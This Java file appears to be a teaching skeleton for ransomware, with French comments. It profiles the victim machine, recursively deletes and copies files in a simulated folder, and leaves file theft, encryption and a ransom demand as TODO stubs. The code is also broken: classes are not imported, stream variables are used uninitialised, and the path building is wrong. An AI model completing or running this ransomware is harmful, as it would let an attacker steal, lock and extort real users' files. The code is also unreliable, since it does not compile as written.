package DumbRansomware;

import java.io.File;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.PrintStream;
import java.text.SimpleDateFormat;
import java.util.Calendar;


public class DumbRansomware {

    private static DumbRansomware dumbransomware;
    private static final boolean RUN = true; //PASSEZ LE A FALSE LORSQUE VOUS ÊTES EN DEBUG

    private DumbCustomerReader Victim;

    private DumbRansomware(){
        Victim = DumbCustomerReader.getInstance();
    }
    public static void main(String[] args) {
        //redirection du terminal vers un fichier de log dans le dossier Log pour suivre ce qui se passe en Run
        if(RUN){
            try {
                String filename = System.getProperty("java.class.path")+"/../Log/"+ new SimpleDateFormat("yyyyMMddHHmmss").format(Calendar.getInstance().getTime())+".txt";
                System.setOut(new PrintStream(new FileOutputStream(filename)));
            } catch (FileNotFoundException e) {}
        }
        
        
        //Initialisation du ransomware
        DumbRansomware ransom = DumbRansomware.GetInstance();

        //On enregistre toutes les infos propriétés et réseaux de la victime dans le log
        ransom.getVictim().showFullProperties();

        //On affiche la liste des fichiers corruptibles
        ransom.MapFiles();

        //On copie les fichiers que l'on souhaite garder dans le dossier ToAnalyze
        ransom.AnalyzeFiles();

        //On chiffre (cipher) les fichiers de la victime
        ransom.CipherFilesOfVictim(); 

        //On affiche une demande de rançon 
        ransom.GiveMeMoney();
    }

    private void deleteFiles(String dir){
        File path = new File(dir);
        if (path.exists()){
            File[] files = path.listFiles();
            for(File f : files){
                if (f.isDirectory()){
                    deleteFiles(path+"/"+f);
                } else {
                    f.delete();
                }
            }
        }
    }

    private void copyFiles(String dirIn, String dirOut){
        InputStream in;
        OutputStream out;
        try {
            in = new FileInputStream(dirIn);
            out = new FileOutputStream(dirOut);
            byte[] buffer = new byte[1024];
            int length;
            while ((length = in.read(buffer)) > 0) {
                out.write(buffer, 0, length);
            }
        } finally {
        in.close();
        out.close();
        }
    }

    private void MapFiles(){
        //Pour l'exemple, dans un premier temps on simule le system de fichiers de la victime (dossier VictimFiles) 
        //en le réinitialisant avec les dossiers et fichiers contenu dans FilesSystem

        //Suppression du contenu du répertoire VictimFiles
        deleteFiles("/../VictimFiles");

        //Copie du contenu du répertoire FilesSystem dans le répertoire VictimFiles
        copyFiles("/../FilesSystem","/../VictimFiles");

        //On genere le Repertoire (MapFolder) de la victime
        MapFolder repertoire= new MapFolder("/../VictimFiles");
    }

    private void AnalyzeFiles(){
        //TODO
        //Garder les fichiers images et topsecret par exemple, les dossiers privées
        //Copier ces fichiers et dossiers intéressant dans le dossier ToAnalyze
        //Tips : on travaille avec le Repertoire (MapFolder) de la Victim.  
        //Pensez à ajouter des attributs vous facilitant le travail dans MapFolder
    }

    private void CipherFilesOfVictim(){
        //TODO
        //Chiffrer les fichiers de la victim 
        //Tips : Utiliser la methode de chiffrement de MapFolder
    }

    private void GiveMeMoney(){
        //TODO
        //affiche une page web par exemple  
    }

    public static DumbRansomware GetInstance(){
        if(dumbransomware==null){
            dumbransomware = new DumbRansomware();
        }
        return dumbransomware;
    }

    public DumbCustomerReader getVictim(){return Victim;}

    

}
